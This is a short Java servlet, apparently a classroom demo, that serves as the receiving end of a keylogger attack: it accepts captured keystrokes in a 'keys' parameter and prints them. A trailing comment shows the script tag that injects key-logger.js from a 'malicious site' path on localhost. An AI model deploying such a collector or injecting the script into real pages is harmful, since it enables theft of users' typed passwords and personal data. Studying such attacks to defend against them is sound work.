import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/key-logger")
public class KeyLoggerServlet extends HttpServlet {
			
	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String keys = req.getParameter("keys");
		System.out.println("!!!! Están pulsando las teclas: " + keys);
	}
	
}

//<script src="http://localhost:8080/sitio-maligno/key-logger.js"></script>
